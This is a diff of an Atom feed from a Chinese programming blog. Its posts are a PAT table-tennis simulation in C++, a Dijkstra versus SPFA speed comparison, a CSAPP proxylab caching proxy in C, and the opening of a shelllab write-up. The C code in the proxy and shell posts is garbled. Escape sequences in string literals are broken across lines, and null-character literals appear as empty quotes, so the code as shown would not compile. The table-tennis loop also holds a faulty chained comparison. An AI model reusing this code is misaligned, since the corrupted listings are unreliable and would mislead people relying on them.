+主要就是将题目中的时间 <code>08:00:00</code> - <code>21:00:00</code> 以每秒一个间隔，总共 <code>13*60*60=46800</code> 个时钟滴答，在每一个始终滴答到来的时候，依次处理玩家到达事件、桌子使用计时减1事件、空桌子安排玩家使用事件。<br>
+这样思考总体上逻辑简洁一些。</p>
+<p><strong>具体的看代码</strong> ：</p>
+<pre><code class="language-cpp">#include&lt;bits/stdc++.h&gt;
+using namespace std;
+#define MAXPEOPLE 10005
+#define MAXTABLE 105
+#define TIME2SECOND(h,m,s) ((((h) - 8) * 3600) + ((m) * 60) + (s))
+#define MINUTE2SECOND(m) ((m) * 60)
+#define MAXTIMESTAMP 46800
+
+
+int second2minute(int s)
+{
+	//秒数转分钟，并且舍入
+	int m = s / 60;
+	if ((s % 60) &gt;= 30)
+		m++;
+	return m;
+}
+
+void printTime(int second)
+{
+	//根据秒数打印时间
+	int h, m, s;
+	h = second / 3600 + 8;
+	second = second % 3600;
+	m = second / 60;
+	second = second % 60;
+	s = second;
+	printf(&quot;%02d:%02d:%02d &quot;, h, m, s);
+}
+
+struct People
+{
+	int arrTime = 0;	//到达时间
+	int needTime = 0;	//需要的时间
+	int serverTime = -1;	//服务开始时间
+	bool VIP = false;		//是否是VIP
+	bool servered = false;	//是否已被服务
+};
+
+int n, tableNum, viptableNum, minemptytable;	//记录数、桌子总数，vip桌子总数，索引号最小的空桌子的索引
+int timeStamp;	//时间戳,8:00:00为0,21:00:00为46800
+int serverIndex, arriveIndex;	//当前未服务玩家的索引、当前可服务玩家索引  [serverIndex,arriveIndex)为当前时间
+								//可服务但尚未服务的玩家
+queue&lt;int&gt; VIPwaitIndex;		//在等待中的vip玩家
+People playpairs[MAXPEOPLE];	//玩家记录
+int tables[MAXTABLE] = { 0 };	//当前桌子还要用多久，0代表空桌子
+
+bool isVIP[MAXTABLE] = { false };	//记录桌子是不是VIP桌
+int serverNum[MAXTABLE] = { 0 };	//每个桌子服务过的人数
+vector&lt;int&gt; VIPtable;		//记录vip桌子的索引
+
+void dealServerIndex();
+void handelTableUse()
+{
+	//在每一个时钟滴答到来时，将正在使用的桌子的使用时间减少1，如果减少后为0，则该桌子为空，考虑更新minemptytable
+	int i;
+	for (i = 0; i &lt; tableNum; i++) {
+		if (tables[i] &gt; 0)
+			tables[i]--;
+		if (tables[i] == 0)
+			if (i &lt; minemptytable)	//考虑更新minemptytable
+				minemptytable = i;
+	}
+}
+
+void serverPeople(int peopleIndex, int tableIndex)
+{
+	//服务playpairs中索引号为peopleIndex的玩家，使用的桌子为tableIndex
+	playpairs[peopleIndex].servered = true;	//标记已服务
+	playpairs[peopleIndex].serverTime = timeStamp;	//记录服务时间
+	tables[tableIndex] = playpairs[peopleIndex].needTime;	//开始桌子时间的倒计时
+	serverNum[tableIndex]++;	//记录该桌子的服务人数
+	while (minemptytable &lt; tableNum &amp;&amp; tables[minemptytable]&gt;0) {
+		//更新minemptytable，这里一定要用while，因为空桌子不是连续的
+		minemptytable++;
+	}
+	dealServerIndex();
+}
+
+void dealServerIndex()
+{
+	//更新待服务玩家索引serverIndex，这里一定要用while，因为可能存在有的玩家因为VIP插队的原因已经被服务了
+	while (playpairs[serverIndex].servered) {
+		serverIndex++;
+	}
+}
+
+void dealVIPtable()
+{
+	//处理空的VIP专属桌子
+	for (int t : VIPtable) {
+		if (tables[t] == 0 &amp;&amp; !VIPwaitIndex.empty()) {
+			//桌子为空且有VIP玩家在等待，则服务这个玩家
+			int p = VIPwaitIndex.front();
+			VIPwaitIndex.pop();
+			serverPeople(p, t);
+		}
+	}
+}
+
+void handelEmptyTable()
+{
+	//在每一个时钟滴答，把桌子的使用倒计时-1后，处理所有的空桌子
+	dealVIPtable();	//首先处理VIP桌子，因为如果等待队列中的第一人是VIP，
+					//且同时存在VIP桌子和普通桌子时，优先选择VIP桌子
+
+	//按序处理所有空桌子
+	while (minemptytable &lt; tableNum &amp;&amp; serverIndex &lt; arriveIndex) {
+		if (playpairs[serverIndex].VIP) {
+			//如果排在第一的是一个VIP玩家，则他一定没有VIP桌子可用了，所以他用了一个普通桌子，
+			//因此不会在dealVIPtable()中出对，故要移出VIP等待队列
+			VIPwaitIndex.pop();
+		}
+		serverPeople(serverIndex, minemptytable);
+	}
+}
+
+void handelPeopleArrive()
+{
+	//在每一个时钟滴答，如果到了下一个玩家到来的时间，就将arriveIndex++，代表到达了
+	//一个新的玩家，并考虑他是不是VIP，是则加入VIP等待队列
+	if (playpairs[arriveIndex].arrTime == timeStamp) {
+		if (playpairs[arriveIndex].VIP) {
+			VIPwaitIndex.push(arriveIndex);
+		}
+		arriveIndex++;
+	}
+}
+
+int main() {
+	int h, m, s, i, need, tag;
+	scanf(&quot;%d&quot;, &amp;n);
+	for (i = 0; i &lt; n; i++) {
+		//玩家信息输入
+		scanf(&quot;%d:%d:%d %d %d&quot;, &amp;h, &amp;m, &amp;s, &amp;need, &amp;tag);
+		if (need &gt; 120) {
+			need = 120;
+		}
+		playpairs[i].arrTime = TIME2SECOND(h, m, s);
+		playpairs[i].needTime = MINUTE2SECOND(need);
+		if (tag == 1)
+			playpairs[i].VIP = true;
+	}
+	scanf(&quot;%d %d&quot;, &amp;tableNum,&amp;viptableNum);
+	for (i = 0; i &lt; viptableNum; i++) {
+		//桌子信息输入
+		int v;
+		scanf(&quot;%d&quot;, &amp;v);
+		VIPtable.push_back(--v);	//将桌子索引转为0开始
+		isVIP[v] = true;
+	}
+
+	//按照玩家到达时间升序排列
+	sort(playpairs, playpairs + n, [](People&amp; a, People&amp; b) {return a.arrTime &lt; b.arrTime; });
+
+	serverIndex = 0;
+	minemptytable = 0;
+	arriveIndex = 0;
+	for (timeStamp = 0; timeStamp &lt; MAXTIMESTAMP; timeStamp++) {
+		//每一个时间戳，首先处理玩家到达事件，再处理桌子使用计时减1事件，最后处理
+		//空桌子使用事件，三者的顺序不能颠倒
+		handelPeopleArrive();
+		handelTableUse();
+		handelEmptyTable();
+		if (serverIndex == arriveIndex == n)	
+			//所有玩家都已经服务了
+			break;
+	}
+
+	for (i = serverIndex; i &lt; arriveIndex; i++) {
+		//在[serverIndex,arriveIndex)中，可能存在因为VIP插队而已被服务的玩家，故要
+		//把该玩家提前，这样最后在[0,serverIndex)中的就是全部服务过的玩家
+		if (playpairs[i].servered) {
+			playpairs[serverIndex++] = playpairs[i];
+		}
+	}
+
+	//根据服务时间升序排列
+	sort(playpairs, playpairs + serverIndex, [](People&amp; a, People&amp; b) {return a.serverTime &lt; b.serverTime; });
+	
+	//答案输出
+	for (i = 0; i &lt; serverIndex; i++) {
+		printTime(playpairs[i].arrTime);
+		printTime(playpairs[i].serverTime);
+		printf(&quot;%d\n&quot;, second2minute(playpairs[i].serverTime - playpairs[i].arrTime));
+	}
+	printf(&quot;%d&quot;, serverNum[0]);
+	for (i = 1; i &lt; tableNum; i++) {
+		printf(&quot; %d&quot;, serverNum[i]);
+	}
+
+	return 0;
+}
+
+
+/*
+//input
+2
+08:00:00 10 1
+08:05:00 10 1
+3 2
+2 3
+
+//output
+08:00:00 08:00:00 0
+08:05:00 08:05:00 0
+0 1 1
+*/
+
+
+/*
+//input
+2
+20:00:00 60 0
+20:30:00 10 1
+1 1
+1
+
+//output
+20:00:00 20:00:00 0
+1
+*/
+</code></pre>
+<p>最下面是算法笔记上给出的几组测试数据。<br>
+<img src="http://static.yulan.net.cn/image/_fd5b180732b660f13e5fc326933e6bb1.png" alt="" loading="lazy"><br>
+这种方法虽然外层循环有46800次，但是内层大部分时间只是一个简单的判断，没有实际操作，所以耗时并不高。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Dijkstra算法与SPFA算法]]></title>
+        <id>https://yulangz.github.io/post/sw67dr_hpnu4t/</id>
+        <link href="https://yulangz.github.io/post/sw67dr_hpnu4t/">
+        </link>
+        <updated>2021-08-06T05:48:53.000Z</updated>
+        <content type="html"><![CDATA[<p>最近看了《算法笔记》上面关于最短路径的部分，学习了一种之前没见过的算法：<strong>SPFA。</strong><br>
+理论上SPFA算法会比Dijkstra快，顾而找了一题测试一下。<br>
+使用PAT A1072题，因为这题求<strong>最短路径的部分很单纯，没有其他的权，而且测试点的复杂度够高，能够看出时间上的差别。</strong><br>
+<a href="https://pintia.cn/problem-sets/994805342720868352/problems/994805396953219072">题目链接</a></p>
+<h2 id="速度对比重点看测试点4">速度对比（重点看测试点4）</h2>
+<h3 id="dijkstra速度">Dijkstra速度</h3>
+<figure data-type="image" tabindex="1"><img src="http://static.yulan.net.cn/image/image_3dfbda0886ef9d9aefa1315db1cb7f78.png" alt="image.png" loading="lazy"></figure>
+<h3 id="spfa">SPFA</h3>
+<p><img src="http://static.yulan.net.cn/image/image_78d365c8596c6ebefa6224fa455883c0.png" alt="image.png" loading="lazy"><br>
+多次提交对比，Dijkstra算法都在50ms左右，而SPFA一直在10ms左右，可见SPFA确实比Dijkstra快不少，而且思路也不复杂，以后可以多多使用。</p>
+<h2 id="代码如下">代码如下</h2>
+<pre><code class="language-cpp">#include&lt;bits/stdc++.h&gt;
+#include&lt;unordered_map&gt;
+using namespace std;
+#define MAXNODE 1015
+#define INF 0x3ffffff
+#define G2index(G) ((n)+(G))
+#define index2G(index) ((index)-(G))
+
+struct Node
+{
+	int v, dis;//目标与距离
+};
+
+int dis[MAXNODE];
+int n, m, k, dmax;
+bool used[MAXNODE], inqueue[MAXNODE];
+vector&lt;Node&gt; graph[MAXNODE];
+
+void Dijkstra(int start)
+{
+	fill(dis, dis + MAXNODE, INF);
+	fill(used, used + MAXNODE, false);
+	dis[start] = 0;
+
+	for (int i = 0; i &lt; n + m - 1; i++) {
+		int minnode = -1, mindis = INF;
+		for (int j = 1; j &lt;= n + m; j++) {
+			if (!used[j] &amp;&amp; dis[j] &lt; mindis) {
+				minnode = j;
+				mindis = dis[j];
+			}
+		}
+		if (minnode == -1)
+			return;
+
+		used[minnode] = true;
+		int tdis = dis[minnode];
+		for (Node node : graph[minnode]) {
+			if (tdis + node.dis &lt; dis[node.v]) {
+				dis[node.v] = tdis + node.dis;
+			}
+		}
+	}
+}
+
+void SPFA(int start)
+{
+	fill(dis, dis + MAXNODE, INF);
+	fill(inqueue, inqueue + MAXNODE, false);
+	dis[start] = 0;
+
+	int tdis = 0;
+	queue&lt;int&gt; q;
+	for (Node node : graph[start]) {
+		if (tdis + node.dis &lt; dis[node.v]) {
+			dis[node.v] = node.dis + tdis;
+			q.push(node.v);
+			inqueue[node.v] = true;
+		}
+	}
+	while (!q.empty()) {
+		int nodeid = q.front();
+		q.pop();
+		inqueue[nodeid] = false;
+		for (Node node : graph[nodeid]) {
+			tdis = dis[nodeid];
+			if (tdis + node.dis &lt; dis[node.v]) {
+				dis[node.v] = node.dis + tdis;
+				if (!inqueue[node.v]) {
+					q.push(node.v);
+					inqueue[node.v] = true;
+				}
+			}
+		}
+	}
+}
+
+struct Ans
+{
+	int Gid, mindis, totaldis;
+};
+vector&lt;Ans&gt; ans;
+
+void getans(int Gid)
+{
+	int totaldis, mindis;
+	mindis = INF;
+	totaldis = 0;
+	for (int i = 1; i &lt;= n; i++) {
+		if (dis[i] &gt; dmax)
+			return;
+		if (dis[i] &lt; mindis) {
+			mindis = dis[i];
+		}
+		totaldis += dis[i];
+	}
+	ans.push_back(Ans{ Gid,mindis,totaldis });
+}
+
+int main() {
+	scanf(&quot;%d%d%d%d&quot;, &amp;n, &amp;m, &amp;k, &amp;dmax);
+	for (int i = 0; i &lt; k; i++) {
+		int c1, c2, dd;
+		char cs1[10], cs2[10];
+		scanf(&quot;%s%s%d&quot;, cs1, cs2, &amp;dd);
+		if (cs1[0] == 'G') {
+			c1 = G2index(atoi(cs1 + 1));
+		}
+		else {
+			c1 = atoi(cs1);
+		}
+
+		if (cs2[0] == 'G') {
+			c2 = G2index(atoi(cs2 + 1));
+		}
+		else {
+			c2 = atoi(cs2);
+		}
+		graph[c1].push_back(Node{ c2, dd });
+		graph[c2].push_back(Node{ c1, dd });
+	}
+	for (int i = 1; i &lt;= m; i++) {
+		//Dijkstra(G2index(i));
+		SPFA(G2index(i));
+		getans(i);
+	}
+
+	Ans myans;
+	myans.Gid = -1;
+	myans.totaldis = INF;
+	myans.mindis = 0;
+	for (Ans a : ans) {
+		if (a.mindis &gt; myans.mindis)
+			myans = a;
+		else if (a.mindis == myans.mindis) {
+			if (a.totaldis &lt; myans.totaldis)
+				myans = a;
+		}
+	}
+	if (myans.Gid == -1) {
+		printf(&quot;No Solution&quot;);
+		return 0;
+	}
+	printf(&quot;G%d\n%.1lf %.1lf&quot;, myans.Gid, (double)myans.mindis, (double)myans.totaldis / n);
+	return 0;
+}
+</code></pre>
+<p>代码思路就不写了，大家可以看算法笔记。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CSAPP：proxylab]]></title>
+        <id>https://yulangz.github.io/post/uscxh7_cwdngk/</id>
+        <link href="https://yulangz.github.io/post/uscxh7_cwdngk/">
+        </link>
+        <updated>2021-08-06T05:47:14.000Z</updated>
+        <content type="html"><![CDATA[<p>这是本书的最后一个lab了，但总体上没有前面的malloclab和shelllab难，好好看书，多多参考tinyweb的代码，还是比较容易写出来的。</p>
+<h2 id="代码">代码</h2>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &quot;csapp.h&quot;
+
+/* Recommended max cache and object sizes */
+#define MAX_CACHE_SIZE 1049000
+#define MAX_OBJECT_SIZE 102400
+#define MMAXLINE 2048
+#define MAXHEADER 4096
+#define MAXCACHEBLOCK 50
+
+struct cache_block
+{
+    char header[MAXHEADER];
+    char path[MMAXLINE];
+    char *body;
+    int body_size;
+    char visit;
+};
+
+struct _cache
+{
+    struct cache_block *block_slot[MAXCACHEBLOCK];
+    int clock_p;
+    int used_size;
+    int used_block;
+} cache;
+
+int read_cnt;
+sem_t mutex, write_lock;
+
+/* You won't lose style points for including this long line in your code */
+static const char *user_agent_hdr = &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3&quot;;
+
+void doit(int connfd);
+void request_back_server(rio_t *rio_buf, char *host, char *port, char *path, char *real_path);
+void http_error(int fd, char *errnum, char *msg);
+int parse_request(char *request, char *host, char *port, char *path);
+void deal_request_header(char *header_line, int back_server_fd);
+void get_back_response_and_send_to_client(int fd_conn_back_server, int client_fd, char *path);
+void html_error(int fd, char *msg);
+void *thread(void *vargp);
+void init_cache();
+int read_cache(char *header, char *body, char *real_path);
+int write_cache(char *header, char *body, int body_size, char *real_path);
+int next_slot(int need_size);
+void evict();
+
+int main(int argc, char **argv)
+{
+    //printf(&quot;%s
+&quot;, user_agent_hdr);
+    int listenfd, connfd;
+    pthread_t tid;
+    int *vargs = NULL;
+    socklen_t clientlen;
+    struct sockaddr_storage clientaddr;
+    /* Check command line args */
+    if (argc != 2)
+    {
+        fprintf(stderr, &quot;usage: %s &lt;port&gt;
+&quot;, argv[0]);
+        exit(1);
+    }
+
+    init_cache();
+    listenfd = Open_listenfd(argv[1]);
+    while (1)
+    {
+        clientlen = sizeof(clientaddr);
+        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);
+        //doit(connfd);
+
+        if ((vargs = (int *)malloc(sizeof(int))) == NULL)
+        {
+            http_error(connfd, &quot;500&quot;, &quot;not enough memory!&quot;);
+            Close(connfd);
+        }
+        else
+        {
+            *vargs = connfd;
+            pthread_create(&amp;tid, NULL, thread, (void *)vargs);
+        }
+    }
+}
+
+void *thread(void *vargp)
+{
+    int connfd = *((int *)vargp);
+    pthread_detach(pthread_self());
+    free(vargp);
+    doit(connfd);
+    Close(connfd);
+    return NULL;
+}
+
+void doit(int connfd)
+{
+    rio_t Riobuf;
+    char req_buf[MMAXLINE], host[MMAXLINE], port[MMAXLINE], path[MMAXLINE], real_path[MAXLINE];
+    char *header, *body;
+    int body_size;
+    rio_readinitb(&amp;Riobuf, connfd);
+    if (!rio_readlineb(&amp;Riobuf, req_buf, MMAXLINE))
+        return;
+
+    if (parse_request(req_buf, host, port, path) &lt; 0)
+        http_error(connfd, &quot;403&quot;, &quot;Unknown request&quot;);
+    else
+    {
+        sprintf(real_path, &quot;%s:%s%s&quot;, host, port, path);
+        header = (char *)malloc(MAXHEADER);
+        body = (char *)malloc(MAX_OBJECT_SIZE);
+        if (header != NULL &amp;&amp; body != NULL)
+        {
+            if ((body_size = read_cache(header, body, real_path)) &gt;= 0)
+            {
+                Rio_writen(connfd, header, strlen(header));
+                Rio_writen(connfd, &quot;
+&quot;, strlen(&quot;
+&quot;));
+                Rio_writen(connfd, body, body_size);
+                free(header);
+                free(body);
+                return;
+            }
+        }
+        free(header);
+        free(body);
+        request_back_server(&amp;Riobuf, host, port, path, real_path);
+    }
+}
+
+/*根据第一行的请求解析出host，port与请求path，正确返回0，出错返回-1*/
+int parse_request(char *request, char *host, char *port, char *path)
+{
+    char method[MMAXLINE], path_buf[MMAXLINE], version[MMAXLINE], host_buf[MMAXLINE], port_buf[MMAXLINE];
+    char *i, *host_buf_p, *port_buf_p;
+    int have_port = 1;
+    memset(path_buf, 0, MMAXLINE);
+    sscanf(request, &quot;%s %s %s&quot;, method, path_buf, version);
+    if (strcmp(method, &quot;GET&quot;))
+        return -1;
+    i = path_buf;
+    host_buf_p = host_buf;
+    port_buf_p = port_buf;
+    while (*i != '/' &amp;&amp; *i != '')
+        i++;
+    if (*i != '')
+        i++;
+    if (*i != '')
+        i++;
+    while (*i != ':' &amp;&amp; *i != '')
+    {
+        if (*i == '/')
+        {
+            have_port = 0;
+            break;
+        }
+        *host_buf_p++ = *i++;
+    }
+    *host_buf_p = '';
+    if (!have_port)
+    {
+        sprintf(port_buf_p, &quot;80&quot;);
+    }
+    else
+    {
+        i++;
+        while (*i != '/' &amp;&amp; *i != '')
+        {
+            *port_buf_p++ = *i++;
+        }
+        *port_buf_p = '';
+    }
+
+    if (*i == '')
+        return -1;
+
+    sprintf(host, &quot;%s&quot;, host_buf);
+    sprintf(port, &quot;%s&quot;, port_buf);
+    sprintf(path, &quot;%s&quot;, i);
+    //sprintf(request, &quot;%s %s %s
+&quot;, method, i, &quot;HTTP/1.0&quot;);
+    return 0;
+}
+
+/*解析剩下的头部，构造并发送向后台服务器的请求,最后接受请求并返回给客户端*/
+void request_back_server(rio_t *rio_buf, char *host, char *port, char *path, char *real_path)
+{
+    int fd_conn_back_server, fd_conn_client;
+    char buf[MMAXLINE];
+
+    fd_conn_client = rio_buf-&gt;rio_fd;
+    fd_conn_back_server = Open_clientfd(host, port);
+
+    sprintf(buf, &quot;GET %s HTTP/1.0
+&quot;, path);
+    Rio_writen(fd_conn_back_server, buf, strlen(buf));
+    sprintf(buf, &quot;Host: %s:%s
+&quot;, host, port);
+    Rio_writen(fd_conn_back_server, buf, strlen(buf));
+    sprintf(buf, &quot;User-Agent: %s
+&quot;, user_agent_hdr);
+    Rio_writen(fd_conn_back_server, buf, strlen(buf));
+    sprintf(buf, &quot;Connection: close
+&quot;);
+    Rio_writen(fd_conn_back_server, buf, strlen(buf));
+    sprintf(buf, &quot;Proxy-Connection: close
+&quot;);
+    Rio_writen(fd_conn_back_server, buf, strlen(buf));
+
+    while (1)
+    {
+        Rio_readlineb(rio_buf, buf, MMAXLINE);
+        if (!strcmp(buf, &quot;
+&quot;))
+        {
+            Rio_writen(fd_conn_back_server, buf, strlen(buf));
+            break;
+        }
+        deal_request_header(buf, fd_conn_back_server);
+    }
+
+    get_back_response_and_send_to_client(fd_conn_back_server, fd_conn_client, real_path);
+    //Close(connfd);
+    return;
+}
+
+/*处理请求头,忽略给定的头（需要修改的头）,并把其余头发送给后台服务器*/
+void deal_request_header(char *header_line, int back_server_fd)
+{
+    char key[MMAXLINE], value[MMAXLINE];
+    sscanf(header_line, &quot;%s %s&quot;, key, value);
+    if (!strcmp(key, &quot;Host:&quot;))
+        return;
+    else if (!strcmp(key, &quot;User-Agent:&quot;))
+    {
+        return;
+    }
+    else if (!strcmp(key, &quot;Connection:&quot;))
+    {
+        return;
+    }
+    else if (!strcmp(key, &quot;Proxy-Connection:&quot;))
+    {
+        return;
+    }
+    else
+    {
+        Rio_writen(back_server_fd, header_line, strlen(header_line));
+        return;
+    }
+}
+
+/*读后台的返回，并且写给客户端*/
+void get_back_response_and_send_to_client(int fd_conn_back_server, int client_fd, char *real_path)
+{
+    int body_length, body_length_record;
+    ssize_t read_size;
+    rio_t rio_buf;
+    char buf[MMAXLINE], key[MMAXLINE], value[MMAXLINE];
+    char *body_data, *temp_body_data_ptr, *temp_buf_ptr, *header_data;
+    Rio_readinitb(&amp;rio_buf, fd_conn_back_server);
+
+    if ((header_data = (char *)malloc(MAXHEADER)) == NULL)
+    {
+        http_error(client_fd, &quot;500&quot;, &quot;not enough memory&quot;);
+        return;
+    }
+
+    Rio_readlineb(&amp;rio_buf, buf, MMAXLINE); //返回码
+    Rio_writen(client_fd, buf, strlen(buf));
+    sprintf(header_data, &quot;%s&quot;, buf);
+
+    while (1)
+    { /*读头部*/
+        Rio_readlineb(&amp;rio_buf, buf, MMAXLINE);
+        if (!strcmp(buf, &quot;
+&quot;))
+        {
+            Rio_writen(client_fd, buf, strlen(buf));
+            break;
+        }
+        //deal_request_header(buf, fd_conn_back_server);
+        sscanf(buf, &quot;%s %s&quot;, key, value);
+        if (!strcmp(key, &quot;Content-length:&quot;))
+        {
+            body_length = atoi(value);
+        }
+        Rio_writen(client_fd, buf, strlen(buf));
+        strcat(header_data, buf);
+    }
+
+    if (body_length &gt; MAX_OBJECT_SIZE) //不能缓存
+    {
+        while (body_length &gt; 0)
+        {
+            read_size = Rio_readnb(&amp;rio_buf, buf, MMAXLINE);
+            body_length -= read_size;
+            Rio_writen(client_fd, buf, read_size);
+        }
+        free(header_data);
+    }
+    else //可以缓存
+    {
+        if ((body_data = (char *)malloc(body_length)) == NULL)
+        {
+            html_error(client_fd, &quot;not enough memory&quot;);
+            //Close(client_fd);
+            Close(fd_conn_back_server);
+            return;
+        }
+        body_length_record = body_length;
+        temp_body_data_ptr = body_data;
+        while (body_length &gt; 0)
+        {
+            read_size = Rio_readnb(&amp;rio_buf, buf, MMAXLINE);
+            body_length -= read_size;
+
+            Rio_writen(client_fd, buf, read_size);
+
+            temp_buf_ptr = buf; //写局部缓存
+            while (read_size &gt; 0)
+            {
+                *temp_body_data_ptr++ = *temp_buf_ptr++;
+                read_size--;
+            }
+        }
+        write_cache(header_data, body_data, body_length_record, real_path);
+        free(header_data);
+        free(body_data);
+    }
+
+    Close(fd_conn_back_server);
+    //Rio_writen(client_fd, )
+}
+/*如函数名*/
+void http_error(int fd, char *errnum, char *msg)
+{
+    char buf[MMAXLINE];
+
+    /* Print the HTTP response headers */
+    sprintf(buf, &quot;HTTP/1.0 %s %s
+&quot;, errnum, msg);
+    Rio_writen(fd, buf, strlen(buf));
+    sprintf(buf, &quot;Content-type: text/html
+
+&quot;);
+    Rio_writen(fd, buf, strlen(buf));
+
+    /* Print the HTTP response body */
+    sprintf(buf, &quot;&lt;html&gt;&lt;title&gt;Request Error&lt;/title&gt;&quot;);
+    Rio_writen(fd, buf, strlen(buf));
+    sprintf(buf, &quot;&lt;body bgcolor=&quot;
+                 &quot;ffffff&quot;
+                 &quot;&gt;
+&quot;);
+    Rio_writen(fd, buf, strlen(buf));
+    sprintf(buf, &quot;%s: %s
+&quot;, errnum, msg);
+    Rio_writen(fd, buf, strlen(buf));
+    sprintf(buf, &quot;&lt;hr&gt;&lt;em&gt;The Tiny Proxy server&lt;/em&gt;
+&quot;);
+    Rio_writen(fd, buf, strlen(buf));
+}
+
+void html_error(int fd, char *msg)
+{
+    char buf[MMAXLINE];
+
+    sprintf(buf, &quot;&lt;html&gt;&lt;title&gt;Request Error&lt;/title&gt;&quot;);
+    Rio_writen(fd, buf, strlen(buf));
+    sprintf(buf, &quot;&lt;body bgcolor=&quot;
+                 &quot;ffffff&quot;
+                 &quot;&gt;
+&quot;);
+    Rio_writen(fd, buf, strlen(buf));
+    sprintf(buf, &quot;%s
+&quot;, msg);
+    Rio_writen(fd, buf, strlen(buf));
+    sprintf(buf, &quot;&lt;hr&gt;&lt;em&gt;The Tiny Proxy server&lt;/em&gt;
+&quot;);
+    Rio_writen(fd, buf, strlen(buf));
+}
+
+void init_cache()
+{
+    memset(cache.block_slot, 0, MAXCACHEBLOCK * sizeof(struct cache_block *));
+    cache.clock_p = 0;
+    cache.used_block = 0;
+    cache.used_size = 0;
+    read_cnt = 0;
+    sem_init(&amp;mutex, 0, 1);
+    sem_init(&amp;write_lock, 0, 1);
+}
+
+/*找到返回body_size，并且写header与body，找不到返回-1*/
+int read_cache(char *header, char *body, char *real_path)
+{
+    P(&amp;mutex);
+    if (++read_cnt == 1)
+        P(&amp;write_lock);
+    V(&amp;mutex);
+
+    int i, find = 0;
+    for (i = 0; i &lt; MAXCACHEBLOCK; i++)
+    {
+        if (cache.block_slot[i] != NULL &amp;&amp; !strcmp(cache.block_slot[i]-&gt;path, real_path))
+        {
+            find = 1;
+            break;
+        }
+    }
+
+    if (find)
+    {
+        struct cache_block *block = cache.block_slot[i];
+        sprintf(header, &quot;%s&quot;, block-&gt;header);
+        memcpy(body, block-&gt;body, block-&gt;body_size);
+        block-&gt;visit = 1;
+        find = block-&gt;body_size;
+    }
+    else
+        find = -1;
+
+    P(&amp;mutex);
+    if (--read_cnt == 0)
+        V(&amp;write_lock);
+    V(&amp;mutex);
+
+    return find;
+}
+
+/*成功返回1，失败返回0*/
+int write_cache(char *header, char *body, int body_size, char *real_path)
+{
+    P(&amp;write_lock);
+
+    int slot;
+    struct cache_block *block;
+
+    slot = next_slot(body_size);
+    block = cache.block_slot[slot] = (struct cache_block *)malloc(sizeof(struct cache_block));
+
+    sprintf((block-&gt;path), &quot;%s&quot;, real_path);
+    sprintf((block-&gt;header), &quot;%s&quot;, header);
+    block-&gt;visit = 1;
+    block-&gt;body_size = body_size;
+    cache.used_block++;
+    cache.used_size += body_size;
+    if ((block-&gt;body = (char *)malloc(body_size)) == NULL)
+    {
+        V(&amp;write_lock);
+        return 0;
+    }
+    memcpy(block-&gt;body, body, body_size);
+    V(&amp;write_lock);
+    return 1;
+}
+
+/*write已经获得了写锁，所以next_slot与evict都不用再加锁*/
+int next_slot(int need_size)
+{
+    while (cache.used_size + need_size &gt; MAX_CACHE_SIZE || cache.used_block &gt;= MAXCACHEBLOCK)
+        evict();
+    while (cache.block_slot[cache.clock_p] != NULL)
+        cache.clock_p = (cache.clock_p + 1) % MAXCACHEBLOCK;
+    return cache.clock_p;
+}
+
+void evict()
+{
+    struct cache_block *block;
+    while (1)
+    {
+        block = cache.block_slot[cache.clock_p];
+        if (block == NULL)
+        {
+            cache.clock_p = (cache.clock_p + 1) % MAXCACHEBLOCK;
+            continue;
+        }
+        if (block-&gt;visit)
+        {
+            block-&gt;visit = 0;
+        }
+        else
+        {
+            free(block-&gt;body);
+            cache.used_size -= block-&gt;body_size;
+            cache.used_block--;
+            free(block);
+            cache.block_slot[cache.clock_p] = NULL;
+            return;
+        }
+
+        cache.clock_p = (cache.clock_p + 1) % MAXCACHEBLOCK;
+    }
+}
+</code></pre>
+<h2 id="源文件">源文件</h2>
+<p><a href="http://static.yulan.net.cn/image/csapp_proxylab.c">proxy.c</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CSAPP: shelllab]]></title>
+        <id>https://yulangz.github.io/post/uscxh7_mhapqg/</id>
+        <link href="https://yulangz.github.io/post/uscxh7_mhapqg/">
+        </link>
+        <updated>2021-08-06T05:45:05.000Z</updated>
+        <content type="html"><![CDATA[<p>这次的实验要求我们实现一个简化版的shell，需要能够实现子程序的前台与后台运行以及切换，同时实现几条内建命令。<br>
+需要我们实现的内建命令包括以下4个：</p>
+<ul>
+<li>quit： 退出shell</li>
+<li>jobs： 打印子进程列表与运行状态</li>
+<li>fg： 切换进程到前台运行</li>
+<li>bg： 切换进程到后台运行</li>
+</ul>
+<hr>
+<h2 id="eval"><code>eval()</code></h2>
+<pre><code class="language-c">void eval(char *cmdline)
+{
+    char *argv[MAXARGS];
+    char buf[MAXLINE];
+    int bg;
+    pid_t pid;
+    sigset_t mask_one, mask_all, pre_mask;
+    sigfillset(&amp;mask_all);
+    sigemptyset(&amp;mask_one);
+    sigaddset(&amp;mask_one, SIGCHLD);
+    strcpy(buf, cmdline);
+    bg = parseline(buf, argv);
+    if (argv[0] == NULL)
+        return;
+    if (!builtin_cmd(argv))
+    {
+        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;pre_mask);//阻断SIGCHLD
+        if ((pid = fork()) == 0)
+        {
+            setpgid(0, 0); //*******很重要
+            sigprocmask(SIG_SETMASK, &amp;pre_mask, NULL);
+            if (execve(argv[0], argv, environ) &lt; 0)
+            {
+                printf(&quot;%s: Command not found
+&quot;, argv[0]);
+                exit(0);
+            }
+        }
+        sigprocmask(SIG_BLOCK, &amp;mask_all, NULL);//addjob涉及全局变量访问
+        if (bg)
+            addjob(jobs, pid, BG, buf);
+        else
+            addjob(jobs, pid, FG, buf);
+        if (!bg)
+            waitfg(pid);
+        else
+        {
+            struct job_t *curr_bgmask = getjobpid(jobs, pid);
+            printf(&quot;[%d] (%d) %s&quot;, curr_bgmask-&gt;jid, curr_bgmask-&gt;pid, curr_bgmask-&gt;cmdline);
+        }
+        sigprocmask(SIG_SETMASK, &amp;pre_mask, NULL);
+    }
+    return;
+}
+</code></pre>
+<p>这个函数本身比较简单，书上的代码拿来改改就能用，但是有一个<strong>特别重要</strong>的问题需要注意<br>
+<img src="http://static.yulan.net.cn/image/_d39d0b88e903b260fa9be52bc967f7be.png" alt="" loading="lazy"><br>
